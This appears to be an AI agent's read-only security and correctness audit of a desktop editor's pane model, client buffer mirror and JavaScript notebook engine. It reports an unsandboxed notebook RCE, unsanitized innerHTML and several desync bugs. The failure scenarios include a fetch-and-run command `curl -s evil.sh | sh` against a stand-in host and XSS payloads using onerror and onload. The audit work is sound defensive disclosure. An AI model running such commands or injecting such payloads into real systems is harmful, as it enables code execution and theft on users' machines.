# MWB client stack, pane model & notebook engine — audit

**Date:** 2026-07-02
**Auditor:** Audit agent 3 (final re-run)
**Branch:** main @ efe0fa6d — suite green (3290), not re-run.
**Method:** read-only; every crash/exec claim traced to source and, where noted, reproduced with
a throwaway Node probe in the scratchpad (no repo mutation, app not launched).

## Scope

| File | Lines | Focus | Prod / proto |
|---|---|---|---|
| apps/desktop/mwb/notebook-engine.js | ~463 | AsyncFunction cell scope | **prod** (spine.js:61) |
| apps/desktop/mwb/notebook-output.js | ~372 | descriptor bounding / DOM injection | **prod** (spine.js:62) |
| apps/desktop/mwb/client-buffer.js | ~409 | client text mirror, server-edit apply | **prod** (server-view-client.js:39) |
| apps/desktop/mwb/pane-model.js | ~1076 | durable-id, corrupt workspaces.json | **prod** (spine) |
| apps/desktop/mwb/buffer-registry.js | ~390 | name collision, kill-while-visible | **prod** (spine) |
| apps/desktop/mwb/data-source.js | ~145 | registration/dispose lifecycle | **prod** (spine) |
| apps/desktop/mwb/view-client.js | ~1082 | VIEW apply, point clamp | **prototype** (view-harness.html) |
| apps/desktop/mwb/pane-view-client.js | ~330 | pane render client | **prototype** (pane-harness.html) |
| apps/desktop/mwb/pane-client-layout.js | ~130 | pure rect math | prototype-side |
| apps/desktop/mwb/picker-panel.js | ~300 | completion/switch UI | **prototype** (harness) |
| apps/desktop/mwb/path-complete.js | ~80 | path completion | prod |
| apps/desktop/mwb/path-resolve.js | ~40 | ~ expansion | prod |
| apps/desktop/mwb/media-kinds.js | ~50 | suffix→kind | prod |
| apps/desktop/mwb/citation-bridge.js | ~200 | CSL picker bridge | prod |

The production render client is `apps/desktop/src/server-view-client.js`. `mwb/view-client.js`,
`mwb/pane-view-client.js`, `mwb/pane-client-layout.js` and `mwb/picker-panel.js` are the proven
**bake-off harnesses** (loaded only by `view-harness.html` / `pane-harness.html`; each says
"production is untouched"). They reuse the same *production* `client-buffer.js` and `pane-model.js`
modules, so mirror/pane findings in those two apply everywhere; findings *unique to the harness
render code* are flagged as such and down-weighted.

## Executive summary

**One P0, fully confirmed and reproduced.** The JavaScript notebook (`M-x notebook-cells`, merged
2026-06-27) evaluates each cell as `new AsyncFunction(...)` **inside the spine's Node process** with
no sandbox (`spine.runNotebookCell` ← `INTENT.NOTEBOOK_EVAL`, `server.js:1014`). An `AsyncFunction`
body runs in the Node global scope, so a cell reaches `process`, `globalThis`, `fetch`, and dynamic
`import()`. A scratchpad probe compiled a body exactly as `compileCell` does and ran
`execSync('echo pwned')` → `"pwned"`. **A shared or downloaded notebook is hostile content**: opening
it and running a cell (or "run all") is arbitrary code execution with the user's full privileges —
read `~/.ssh`, exfiltrate `process.env`, `rm -rf`. This is MWBC-01.

Secondary security finding (MWBC-02): cell output descriptors of type `svg` / `html` are written to
the DOM with **`innerHTML` and no sanitization** (`notebook-cells-view.js:347,350`), and the
auto-inspector routes *any* returned string containing `<svg` down the `svg` path.

Data-fidelity, all in the client mirror / pane model (P2, no first-order trigger in normal
in-process operation, but no self-healing if they ever fire):

- **MWBC-06** — a hand-edited / corrupt `workspaces.json` with **duplicate leaf ids** collapses two
  live tree leaves onto one `stateById` entry (Map key collision); one pane then silently renders the
  other's buffer, and focus/content can disagree.
- **MWBC-05** — `applyDelta` feeds an **unclamped `delta.start`** to `storage.replace`, which throws
  `RangeError` on an out-of-range offset; there is no catch, so a diverged/stale delta aborts the
  message handler and leaves the mirror permanently desynced.
- **MWBC-04** — the mirror advertises `lastSeq` "gap detection" but **no code ever detects a gap**;
  worse, `lastSeq` is advanced *before* the `storage.replace` that can throw, so a failed apply
  records "we're current" over wrong text — an undetectable desync with no resync path.
- **MWBC-07** — `pane-model` never clamps a per-leaf `point` to buffer length (`setFocusedPoint`,
  `loadLayout`); the restore path is rescued only by a spine-side band-aid (`clampRestoredPoints`)
  that covers resolved text paths only. The model owns no length invariant; this is the
  persistence-time sibling of the already-confirmed runtime crash SPINE-01.

Two P3 smells: the mirror's echoed-delta fast path (MWBC-03) would diverge under auto-pair/electric
edits but is **dead in production** (the production client abandoned local prediction); and
`swapPanes` (MWBC-08) claims in its comment to re-point leaf `.view` handles it does not actually
re-point.

No other P0/P1. The read-surface mirror, the buffer registry, path resolution, the picker UI
(all `textContent`, injection-safe), and the durable-id restore path are otherwise solid and
well-tested.

## Findings

### MWBC-01: A notebook cell runs arbitrary code in the spine's Node process (hostile-notebook RCE)

- **Severity:** P0
- **Dimension:** Security
- **Location:** `apps/desktop/mwb/notebook-engine.js:296` `compileCell` / `:358` `runCell`
  (`new AsyncFunction(...FACADE_NAMES, wrapped)`); reached via `apps/desktop/mwb/spine.js:5783`
  `runNotebookCell` ← `apps/desktop/mwb/server.js:1014` `case INTENT.NOTEBOOK_EVAL`.
- **Evidence:**
  - `compileCell` compiles the cell body through the `AsyncFunction` constructor. A function built by
    the `Function`/`AsyncFunction` constructor is evaluated in the **global lexical scope**, not the
    module scope — so it does not see the module's imports, but it *does* see every global. In the
    spine (an Electron `utilityProcess`, i.e. Node) the globals include `process`, `globalThis`,
    `Buffer`, `fetch` (Node ≥18), `setTimeout`, and dynamic `import()` is available as syntax.
  - The spine passes an **empty facade** (`runNotebookCellEngine(String(source ?? ''), {}, …)`,
    spine.js:5786), so `require`/`editor` are `undefined` — but that removes only the *facade* vector,
    not the ambient Node globals.
  - Reproduced (scratchpad `probe.mjs`, run under `node`): a body compiled exactly like the isolated
    path (`"use strict";\n<body>`) with the six-arg facade returned `process → "object"`,
    `globalThis → "object"`, `fetch → "function"`, `Object.keys(process.env).length > 0 → true`,
    `await import("node:child_process") → execSync present`, and
    `execSync("echo pwned").toString().trim() → "pwned"`. **Arbitrary command execution confirmed.**
  - Reachability: `M-x notebook-cells` is merged (memory: "Notebook-cells view … MERGED
    2026-06-27") and its cells run server-side (`server.js:1014` → `spine.runNotebookCell`;
    `spine.test.js:2216` header: "Notebook: server-side cell eval (M-x notebook-cells)"). The flag-off
    `notebook-js` shares the path. A user opening a colleague's / downloaded notebook and hitting
    run-cell triggers it — no confirmation prompt.
- **Failure scenario:** A shared notebook contains a cell
  `const cp = await import('node:child_process'); cp.execSync('curl -s evil.sh | sh')`. On "run all"
  it executes with the user's full OS privileges. The spine owns every window, so it is also trivially
  DoS-able with `process.exit()`; `process.env` exfiltration and `~/.ssh` reads are one line each.
- **Fix direction:** Treat notebook cells as untrusted. Options, roughly in order of rigor:
  (1) run cells in a locked-down `worker_threads` worker / separate process with dropped capabilities
  and a curated global set — note plain `node:vm` is *not* a security boundary against a determined
  attacker; (2) gate execution behind explicit per-notebook "trust this notebook" consent (VS Code
  Workspace-Trust style) with a provenance signal; (3) at minimum, shadow `import`/`process`/`fetch`
  as facade parameters bound to `undefined` (defence in depth, not a boundary). This is a design
  decision for the architect — flag it, don't silently pick.
- **Confidence:** CONFIRMED (traced end to end + reproduced).

### MWBC-02: Cell `svg` / `html` output is injected with `innerHTML`, unsanitized

- **Severity:** P1
- **Dimension:** Security
- **Location:** `packages/renderer/src/notebook-cells-view.js:347` (`out.innerHTML = desc.svg`) and
  `:350` (`out.innerHTML = desc.html`); descriptor source `apps/desktop/mwb/notebook-output.js:76`
  `Inspector.html`, `:84` `Inspector.svg`, and the auto-path `:140`
  (`/<svg[\s>]/i.test(value)` → `{type:'svg'}`).
- **Evidence:** `inspect()` classifies *any* returned string matching `/<svg[\s>]/i` as an `svg`
  descriptor, and `Inspector.html(x)` / `Inspector.svg(x)` wrap a raw string verbatim (`String(html)`)
  with **no escaping or sanitization** at any hop — `notebook-output.js` "never touches the DOM", and
  the client sink is a bare `innerHTML =`. A cell returning `'<svg onload="…"><foreignObject>…'` or
  `Inspector.html('<img src=x onerror="…">')` lands as live markup.
- **Failure scenario:** Same hostile-notebook trust model as MWBC-01. Even absent script execution
  (the renderer's CSP forbids `unsafe-inline`/`unsafe-eval`, which blocks `<script>` and *may* block
  inline `onerror=`; I did not confirm the exact CSP), an attacker still gets unsanitized markup
  injection: layout/overlay phishing, `data:` images, external-resource beacons, and any SVG vector
  the CSP does not cover. Combined with MWBC-01 the DOM path is the lesser hole but is independently a
  "never `innerHTML` untrusted strings" violation.
- **Fix direction:** Route `html`/`svg` through an allowlist sanitizer, or render into a
  `<iframe sandbox>` with its own CSP, or drop the raw-HTML escape hatch for untrusted notebooks. Tie
  the decision to the MWBC-01 trust model.
- **Confidence:** CONFIRMED (innerHTML sink + unsanitized descriptor path traced; CSP interaction on
  inline handlers not verified — noted).

### MWBC-06: Duplicate leaf ids in a corrupt/hand-edited workspaces.json collide in `stateById`

- **Severity:** P2
- **Dimension:** Correctness & data safety (persistence)
- **Location:** `apps/desktop/mwb/pane-model.js:212` `makeLeaf` (`stateById.set(leaf.id, state)`),
  `:999` `makeLeaf(bufferId, state, restoredId)` in `loadLayout`/`buildLeaf`; leaf-id minting
  `packages/pane/src/pane.js:65` `createLeafPane` (accepts `options.id` verbatim, **no dedup**).
- **Evidence:** `createLeafPane({ id })` returns a distinct object with whatever id it is handed — two
  restore blobs carrying the same `"pane-leaf-5"` produce two distinct tree leaves that share one id.
  `stateById` is a `Map<id, LeafState>`, and `makeLeaf` does `stateById.set(leaf.id, state)`, so the
  second restored leaf **overwrites** the first's state entry. Downstream:
  - `snapshot()` (`:741`) resolves each leaf via `stateById.get(leaf.id)` → both leaves resolve to the
    *second* state → both panes render the second leaf's buffer/cursor; the first leaf's restored
    buffer is lost.
  - `focusedLeaf()` (`:226`) returns the *first* tree leaf whose id matches `focusedId`, but its state
    is the second's — focus target and rendered content can disagree.
  - `pruneOrphanState()` builds a `Set` of live ids; the duplicated id is present, so nothing prunes
    the shadowing — the corruption persists for the session and re-serialises.
  `bumpIdCounterPast` (`pane.js:46`) only parses a trailing `-(\d+)$`; a hand-edited non-numeric id
  (`"foo"`) is silently ignored by the counter (harmless for fresh mints, but the duplicate-id
  collision above is independent of it).
- **Failure scenario:** A user (or a partial/interleaved write, or a copy-paste while hand-editing
  `~/.godot/workspaces.json`) produces two leaves with the same `id`. On restore, one pane shows the
  wrong file; edits/saves target the buffer the *other* pane thinks it is showing. Silent, not a
  crash — the more dangerous kind for a persistence store.
- **Fix direction:** On restore, dedhupe/reject duplicate leaf ids — either mint a fresh id when
  `stateById.has(id)` in `makeLeaf`, or validate the blob (unique ids) in `loadLayout` and fall back
  to fresh ids on collision. A defensive `if (stateById.has(leaf.id)) leaf.id = freshId()` closes it.
- **Confidence:** CONFIRMED (id reuse + Map overwrite traced; trigger requires non-default/corrupt
  input, which the brief explicitly scopes in).

### MWBC-05: `applyDelta` feeds an unclamped `delta.start` to `storage.replace`, which throws

- **Severity:** P2
- **Dimension:** Correctness & data safety
- **Location:** `apps/desktop/mwb/client-buffer.js:160-162`
  (`const start = delta.start; const end = start + …; storage.replace(start, end, …)`); sink
  `packages/storage/src/buffer.js:189` `replace` → `assertOffset` (`:88` throws
  `RangeError("… out of range [0, length]")`).
- **Evidence:** In the non-echoed branch, `delta.start` and the derived `end` are passed straight to
  `storage.replace` **without a `clampPoint`** — unlike `delta.point`, which *is* clamped one line
  later (`:163`). `storage.replace` asserts both offsets are in `[0, length]` and throws otherwise.
  The production delta apply (`server-view-client.js:502`, always `echoed:false`) has no `try/catch`
  around it, and `onDelta` runs inside `port.onmessage`, so a throw aborts that message's handler.
- **Failure scenario:** Any state where the mirror's length lags the offset the server computed the
  delta against — a dropped/reordered/duplicated delta, or a stale old-buffer delta racing a
  post-switch snapshot. `storage.replace(start > length, …)` throws; the mirror keeps its old text but
  `lastSeq` was already advanced (see MWBC-04); subsequent deltas apply at now-wrong offsets →
  cascading silent corruption with no resync. In-process `MessageChannelMain` is ordered and reliable,
  so there is no *first-order* trigger in normal operation — hence P2 — but there is also no recovery
  if one ever occurs.
- **Fix direction:** Clamp `start`/`end` to `[0, storage.length]` (symmetric with `delta.point`), and
  on a clamp/mismatch request a RESYNC rather than silently applying a truncated edit. Pair with real
  gap detection (MWBC-04).
- **Confidence:** CONFIRMED (unclamped path + throwing sink traced; reachability narrow).

### MWBC-04: `lastSeq` is advertised as "gap detection" but detects no gap; advanced before a throwing apply

- **Severity:** P2
- **Dimension:** Architecture & consistency / latent correctness
- **Location:** `apps/desktop/mwb/client-buffer.js:112-113` (comment "gap detection"),
  `:146` (`lastSeq = delta.seq` — runs *before* the `storage.replace` at `:162`), `:180` ("resync after
  a detected gap"), `:401` `get lastSeq()`.
- **Evidence:** `lastSeq` is written in `applyDelta`/`applySnapshot`/`applyResync` and exposed via one
  accessor, but a repo-wide grep shows **no reader compares `delta.seq` to `lastSeq + 1`** — neither
  the production client (`server-view-client.js`) nor either harness consults `mirror.lastSeq`. So the
  "gap detection" and "resync after a detected gap" the comments describe **do not exist**; a
  dropped/misordered delta is applied blindly (feeding MWBC-05). Because `lastSeq` is advanced at the
  top of `applyDelta`, *before* the `storage.replace` that can throw, a failed apply still records the
  new seq — the mirror says "current" over wrong text.
- **Failure scenario:** Same divergence conditions as MWBC-05; the point is there is no detector to
  catch or heal it, and the field that looks like the detector is inert. This is also playbook drift:
  the module's own doc-comment promises a mechanism the code omits.
- **Fix direction:** Either implement it (on `delta.seq !== lastSeq + 1`, request a RESYNC and drop the
  stale delta; advance `lastSeq` only after a successful apply) or delete the field + comments so no
  future reader trusts a guarantee that isn't there.
- **Confidence:** CONFIRMED.

### MWBC-07: Pane-model never clamps a leaf `point` to buffer length; restore relies on a spine-side band-aid

- **Severity:** P2
- **Dimension:** Correctness & data safety
- **Location:** `apps/desktop/mwb/pane-model.js:711-724` `setFocusedPoint`
  (`Math.max(0, Math.floor(point))` — **low clamp only, no upper bound**), `:987-989`
  `loadLayout`/`buildLeaf` (`state.view.point = point`, `point` only `Number.isFinite`-checked at
  `:954`). Sink `spine.js:5390` `viewStateOf` (`buf.positionAt(v.point)`, unclamped — the SPINE-01
  crash site); partial guard `spine.js:4977` `clampRestoredPoints` (called `:5013`).
- **Evidence:** The pane model treats a per-leaf point as a plain number and enforces no
  "≤ buffer length" invariant — `setFocusedPoint` clamps negatives but not overshoot, and `loadLayout`
  applies a restored `point` verbatim to the leaf's view. The spine's `viewStateOf` then calls the
  throwing `positionAt(v.point)`. The restore path is rescued by `clampRestoredPoints`, **but only for
  leaves where `v.kind === 'text'` and `registry.findByPath(v.path)` resolves to an open buffer**
  (`:4988-4990`); an out-of-range point on an unresolved-path leaf (deleted/missing file → the leaf
  degrades to scratch but still carries the point) or a mislabeled-kind blob slips past the clamp and
  can reach `positionAt`. The *runtime* trigger — a stale cursor after another window shrinks the
  shared buffer — is the already-confirmed SPINE-01 (owned by the spine audit) and is **not** helped
  by `clampRestoredPoints` at all.
- **Failure scenario:** A corrupt/hand-edited `workspaces.json` with a huge `point` on a path that no
  longer resolves → on the window's first `viewStateOf` after restore, `positionAt` throws in the
  spine, which (per SPINE-01) has no `uncaughtException` net → the whole spine dies → every window
  freezes at startup. Narrow, corruption-gated, but it bricks the session.
- **Fix direction:** Make the invariant the model's: clamp `point`/`mark` to `[0, buffer.length]` in
  `setFocusedPoint` and when applying a restored point (`buildLeaf`), so the spine's `positionAt` can
  never be handed an out-of-range offset regardless of input provenance. This also hardens the runtime
  SPINE-01 path from the client side. (The proper systemic fix — a clamp/guard at the `positionAt`
  sink itself — belongs to the spine audit.)
- **Confidence:** CONFIRMED (unclamped model paths + throwing sink traced; the resolved-path restore
  case is guarded, the residual + runtime case is not).

### MWBC-03: The mirror's echoed-delta fast path trusts the prediction and would diverge — but is dead in production

- **Severity:** P3
- **Dimension:** Architecture & consistency / latent correctness
- **Location:** `apps/desktop/mwb/client-buffer.js:145-159` `applyDelta({echoed:true})` (returns after
  advancing cursor/seq, **ignoring `delta.inserted`/`delta.removed`**), predictors `:278` `predictInsert`
  / `:287` `predictDeleteBackward`.
- **Evidence:** The echoed branch assumes the local optimistic prediction is byte-identical to the
  server's edit and never reconciles `delta.inserted`/`delta.removed`. That assumption breaks whenever
  a server-side hook makes the real edit differ from a naive guess — e.g. `auto-pair.lisp:53-55`
  inserts an opener+closer as a **single `insert!` of `"()"`** (one delta, `inserted:"()"`), and its
  backspace handler deletes *both* chars of an empty pair. A predicted single-char insert/delete under
  such a hook would leave the mirror one char behind the canonical, with no checksum/resync to catch it.
  **However:** the production client abandoned local prediction — `server-view-client.js:239-242`
  ("`predicted` [is] gone now that every key routes through the server's keymap") sets every pending
  entry `predicted:false` (`:271`), so `applyDelta` is always called with `echoed:false` (`:502`). The
  echoed branch + `predictInsert`/`predictDeleteBackward` are therefore **only exercised by the
  bake-off prototype `view-client.js`** (which self-inserts via `echoSelfInsert`). And even there, the
  self-insert fast path in `server.js:834-836` is a raw `buffer.insert(char)` that **bypasses the
  keymap** (so auto-pair never fires on it) — the concrete divergence needs a *predicted*
  delete-backward routed through the keymap, which production does not do.
- **Failure scenario:** Latent only. If the plan's "instant typing" local-echo tactic is ever
  re-enabled in the production client (the module is explicitly built for it), this silently becomes a
  live P1: type `(` with auto-pair on and the mirror shows `(` while the file has `()`.
- **Fix direction:** If/when local echo returns, make the echoed path reconcile against `delta` (apply
  the authoritative text when it differs from the prediction) or checksum the mirror against the delta's
  post-state. Until then, a one-line comment that the echoed path is prediction-only + unused-in-prod
  would stop it looking load-bearing.
- **Confidence:** CONFIRMED (dead-in-production; divergence mechanism traced).

### MWBC-08: `swapPanes` comment claims it re-points leaf `.view` handles; it does not

- **Severity:** P3
- **Dimension:** Architecture & consistency
- **Location:** `apps/desktop/mwb/pane-model.js:482-492` `swapPanes` (comment `:487` "and re-point the
  leaf `.view` handles"); leaf `.view` getter minted at `:214` (`get bufferId() { return state.bufferId }`
  closes over the *original* `state`).
- **Evidence:** `swapPanes` exchanges the two `stateById` entries but does nothing to the leaf nodes'
  `.view` handles. Each leaf's `.view.bufferId` getter closes over the `state` captured when the leaf
  was minted, so after a swap `leaf.view.bufferId` still reports the **pre-swap** buffer while
  `stateById.get(leaf.id).bufferId` reports the swapped one — the two disagree, contradicting the
  comment. It is currently harmless because `snapshot()` reads `stateById`, not `leaf.view` — but any
  consumer of the leaf handle (`current-view` in Lisp) would read stale state after a swap.
- **Failure scenario:** `swap-views`/`permute-views` (memory: "MERGED; commands left UNBOUND") followed
  by Lisp code that reads `current-view`'s buffer would see the wrong buffer id. Low reachability
  (commands unbound), pure smell today.
- **Fix direction:** Either make the leaf `.view` getter read through `stateById.get(leaf.id)` (single
  source of truth), or actually re-home the handles in `swapPanes`; delete the misleading comment
  either way.
- **Confidence:** CONFIRMED.

## Architecture observations

- **Two copies of the notebook engine.** `apps/desktop/mwb/notebook-engine.js` (spine) and
  `packages/renderer/src/notebook-cells-engine.js` are near-identical (same `compileCell`,
  `transformLastExprToReturn`, `FACADE_NAMES`, `SHARED_SCOPE_PARAM`). Two divergent copies of a
  security-sensitive evaluator is a maintenance hazard — a hardening fix to one will silently miss the
  other. Consider one shared module. (The renderer copy is the flag-off local path; the spine copy is
  the shipping one.)
- **Harness vs production render clients.** `view-client.js` / `pane-view-client.js` /
  `pane-client-layout.js` / `picker-panel.js` are bake-off harnesses that reuse the production
  `client-buffer.js` + `pane-model.js`. That reuse is the whole point (prove the modules), but it means
  ~1500 lines of self-test-heavy prototype ship in the `apps/desktop/mwb` tree alongside production
  modules; a reader must check `*-harness.html` to know which is live. The file headers do say so —
  keep that discipline.
- **`client-buffer.js` is a genuinely small, clean read surface.** Delegating the entire
  read/positioning surface to `@editor/storage` verbatim (`lineAt`/`positionAt`/`offsetAt`/`slice`) is
  the right call and is why the highlighter/folder run unchanged. The mirror's own logic is confined to
  cursor state + delta apply, which is where all four mirror findings cluster — a good sign the seam is
  in the right place, just under-hardened.
- **Buffer-registry name collision** is handled well (`uniqueName`, Emacs `<n>` suffix); `findByPath`
  dedupes find-file; overlay markers are released on `remove`/`clearOverlays`. Kill-while-visible is
  re-homed one layer up (`server.js:805` `onKillReHome` resyncs every client), so the registry
  correctly does *not* try to own client re-pointing.
- **`addOverlay` (buffer-registry.js:294)** clamps offsets to `≥ 0` but not to buffer length before
  `createMarker(hi)`; overlays originate from server-side match offsets so this is not currently
  reachable with bad input, but it is the same "clamp low, not high" shape as MWBC-07. Minor.
- **`data-source.js`** is clean; `descriptor()` returns the live `state` object by reference, but its
  only consumer is the pane-tree snapshot which serialises over a port (structured-clone copy), so no
  aliasing leak reaches a client.
- **Path resolution is safe-by-design.** `resolveUserPath` (path-resolve.js) expands only the
  current-user `~`, leaves `~user` literal, and uses `node:path.resolve`; `..` escaping the base dir is
  *intended* find-file behaviour in a local editor, not a traversal bug. `completePath` is pure and
  case-insensitive; no symlink or injection surface (the fs read is injected).

## Test coverage

- **`client-buffer.test.js` (353 lines)** — solid on the happy paths: it asserts the echoed delta does
  *not* re-edit (`:116`), that `lastSeq` tracks the last applied seq (`:99,129,139,333`), and that
  points/cursors clamp into `[0, length]` (`:231,267`). **Gaps:** (a) no test where the echoed delta's
  text *differs* from the prediction (the MWBC-03 divergence — the suite only proves the byte-identical
  case, which is exactly why the fragility is invisible); (b) no test that a **gap** is detected or a
  resync triggered (MWBC-04 — the `lastSeq` assertions actually *reinforce* the vestigial field);
  (c) no test feeding an out-of-range `delta.start` (MWBC-05 — would surface the throw).
- **`pane-model.test.js` (659 lines)** — good breadth on tabline curation, reorder bounds (`:179`),
  dedupe of seeded tab ids (`:205`), swap (`:361`), and `serialiseLayout`/`loadLayout` round-trips
  (`:466+`). **Gaps:** (a) **no duplicate-leaf-id restore test** (MWBC-06); (b) no out-of-range restored
  `point` test at the model layer (the clamp lives spine-side and is untested from the model’s view —
  MWBC-07); (c) `swapPanes` is asserted via `stateById`/snapshot only, which *masks* the leaf-`.view`
  drift (MWBC-08). The round-trip tests assert structure/buffers/focus/cursor meaningfully — these are
  real assertions, not smoke.
- **`buffer-registry.test.js` (308 lines)** and **`data-source.test.js` (51 lines)** — registry tests
  are reasonable; data-source coverage is thin (add/get/find), but the module is small and the
  mutable-source seam is documented-unused.
- **Notebook (`spine.test.js:2216+`, `notebook-cells-engine.test.js`)** — functional coverage is good
  (value, console capture, top-level await, thrown-error containment, cross-cell shared scope, session
  isolation). **The security boundary is entirely untested** — there is no test asserting a cell
  *cannot* reach `process` / `child_process` / `import`, because there is no boundary to assert (MWBC-01).
  A regression test that a hardened engine denies those globals should land with the fix.

## What's solid

- **Read-surface fidelity.** Reusing `@editor/storage` verbatim for `text`/`lineAt`/`positionAt`/
  `offsetAt`/`slice` means the mirror cannot get positioning subtly wrong; the highlighter and folder
  run unchanged. `clampPoint` guards every cursor write on the client side.
- **Production dropped local echo.** The decision to route every key through the server keymap
  (`predicted:false` always) eliminates a whole class of optimistic-echo divergence in the shipping
  path; the mirror is a faithful, in-order replay of authoritative server deltas.
- **Durable pane ids across restore** (sibling-verified) and the `bumpIdCounterPast` +
  `serialiseLayout`/`loadLayout` machinery round-trip structure, focus, cursor, minimap companions,
  tablines and media leaves; `pruneOrphanState` keeps `stateById`/`minimapByTarget` from leaking after
  delete/delete-others.
- **Picker UI is injection-safe** — `picker-panel.js` builds every row via `textContent` (label/meta/
  detail), never `innerHTML`, so a hostile filename/buffer-name/workspace-name cannot inject markup.
- **Buffer registry** name-uniquification, path dedupe, dirty tracking, overlay-marker release, and
  spine-level kill re-homing are all correct.
- **Media-kind + path modules** are pure, mirror the main-process suffix sets, and carry no I/O or
  injection surface.

## Open questions

1. **CSP vs inline handlers (MWBC-02).** Does the renderer's CSP block inline `onerror=`/`onload=` on
   `innerHTML`-injected `svg`/`html`? If yes, MWBC-02 is markup-injection only; if no, it is renderer
   XSS. Worth a one-line check of the app's `Content-Security-Policy`.
2. **CSL HTML in the cite picker.** `citation-bridge.js` returns per-entry `html` (CSL-formatted). If
   the renderer's cite picker renders that via `innerHTML`, a crafted `.bib` field or a custom
   `citation-register-style!` CSL could inject markup. The bridge itself is contained (errors caught);
   the risk, if any, is at the renderer render site — outside this file set.
3. **Post-switch stale delta (MWBC-05 first-order trigger).** Can a delta for the *old* buffer ever
   arrive after `onSnapshot` rebuilt the mirror for a new buffer, given per-buffer fan-out on one FIFO
   port? I believe not (the server controls ordering), but a targeted test would retire the last
   reachability doubt on MWBC-05.

## Stats

- **Files audited:** 14 in `apps/desktop/mwb/` (full), plus cross-refs into `spine.js`, `server.js`,
  `server-view-client.js`, `notebook-cells-view.js`, `packages/storage/src/buffer.js`,
  `packages/pane/src/pane.js`, `auto-pair.lisp`.
- **Findings:** 8 — **1 P0**, **1 P1**, **4 P2**, **2 P3**.
  - By dimension: Security 2 (P0, P1); Correctness & data safety 3 (MWBC-05/06/07); Architecture &
    consistency 3 (MWBC-04/03/08, with MWBC-04 also latent-correctness).
- **Confidence:** all 8 CONFIRMED (MWBC-01 reproduced via probe; MWBC-02/04/05/06/08 traced to source;
  MWBC-03 confirmed dead-in-production; MWBC-07 confirmed code paths, narrow reachability).
- **Reproductions:** 1 (scratchpad `probe.mjs` — AsyncFunction cell reaches `process`/`fetch`/
  `import('node:child_process')` → `execSync` → `"pwned"`).
- **DATA-LOSS:** none direct; MWBC-06 is silent wrong-buffer render on a corrupt store (data-integrity,
  not deletion).
